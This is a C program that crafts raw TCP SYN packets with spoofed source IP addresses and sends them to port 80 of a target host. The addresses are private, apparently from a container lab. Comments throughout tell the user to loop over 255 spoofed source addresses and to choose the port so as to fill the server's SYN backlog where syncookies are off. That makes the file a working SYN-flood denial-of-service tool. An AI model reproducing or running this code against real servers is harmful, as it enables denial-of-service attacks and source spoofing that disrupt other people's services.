#include <netinet/tcp.h>            //Provides declarations for tcp header
#include <netinet/ip.h>             //Provides declarations for ip header
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>


struct pseudo_header            //Needed for checksum calculation
{
        unsigned int source_address;
        unsigned int dest_address;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;

        struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
        register long sum;
        unsigned short oddbyte;
        register short answer;

        sum=0;
        while(nbytes>1) {
                sum+=*ptr++;
                nbytes-=2;
        }
        if(nbytes==1) {
                oddbyte=0;
                *((u_char*)&oddbyte)=*(u_char*)ptr;
                sum+=oddbyte;
        }

        sum = (sum>>16)+(sum & 0xffff);
        sum = sum + (sum>>16);
        answer=(short)~sum;

        return(answer);
}


int main (void)
{
        //Create a raw socket
        int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

        //Datagram to represent the packet
        char datagram[4096] , source_ip[32];

        //IP header
        struct iphdr *iph = (struct iphdr *) datagram;

        //TCP header
        struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
        struct sockaddr_in sin;
        struct pseudo_header psh;

        int j = 0;
        for (j=0; j<2; j++)
        {

            if(j==0)
                strcpy(source_ip , "172.17.0.2");                           // THIS IS THE SOURCE IP ADDRESS, HAVE TO MAKE A LOOP OVER THE 255 ADDRESSES OF THE SOURCE NET
            if(j==1)
                 strcpy(source_ip , "172.17.0.4");

            sin.sin_family = AF_INET;                                        // sin struct
            sin.sin_port = htons(80);                                        // sin struct, target port
            sin.sin_addr.s_addr = inet_addr ("172.17.0.3");                  // sin struct, target server

            memset (datagram, 0, 4096);     /* zero out the buffer */

            // Fill in the IP Header
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
            iph->id = htons(54321); //Id of this packet
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;                             // Set to 0 before calculating checksum
            iph->saddr = inet_addr ( source_ip );       // SPOOF THE SOURCE IP ADDRESSES HERE, LOOP OVER 255 ADDRESSES ON YOUR SOURCE NETWORK (SEE ABOVE)
            iph->daddr = sin.sin_addr.s_addr;           // THIS IS THE TARGET IP ADDRESS (SEE ABOVE)

            iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

            // TCP Header
            // tcph->source = htons (1234);   // move source, 0->64K-1  in the loop below
            tcph->dest = htons (80);          // DEST PORT 80, select carefully to fill server syn backlog (syncookies not used)
            tcph->seq = 0;
            tcph->ack_seq = 0;
            tcph->doff = 5;                   // first and only tcp segment */
            tcph->fin=0;
            tcph->syn=1;                      // SYN FLAG SET
            tcph->rst=0;
            tcph->psh=0;
            tcph->ack=0;
            tcph->urg=0;
            tcph->window = htons (5840);    // maximum allowed window size
            tcph->check = 0;                // if you set a checksum to zero, your kernel's IP stack
                                            // your kernels IP-stack sould fill in the correct checksum during transmission
            tcph->urg_ptr = 0;

            //Now the IP checksum

            psh.source_address = inet_addr( source_ip );   // SPOOF SOURCE IP, LOOP 255 (SEE ABOVE)
            psh.dest_address = sin.sin_addr.s_addr;        // DEST IP
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_length = htons(20);

            memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

            tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

            //IP_HDRINCL to tell the kernel that headers are included in the packet
            int one = 1;
            const int *val = &one;
            if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
            {
                    printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
                    exit(0);
            }

            int send_port = 0;
            int i;
            for (i=0; i<5; i++)
            {
                   // sending 5 syns starting with SPT = 0
                   send_port++;
                   tcph->source = htons(send_port);
                    //Send the packet
                    if (sendto (s,          /* our socket */
                                            datagram,       /* the buffer containing headers and data */
                                            iph->tot_len,   /* total length of our datagram */
                                            0,              /* routing flags, normally always 0 */
                                            (struct sockaddr *) &sin,       /* socket addr, just like in */
                                            sizeof (sin)) < 0)              /* a normal send() */
                    {
                            printf ("error\n");
                    }
                    //Data send successfully
                    else
                    {
                            printf ("SPT=%d ",i);
                    }
            }
        }
        return 0;
}

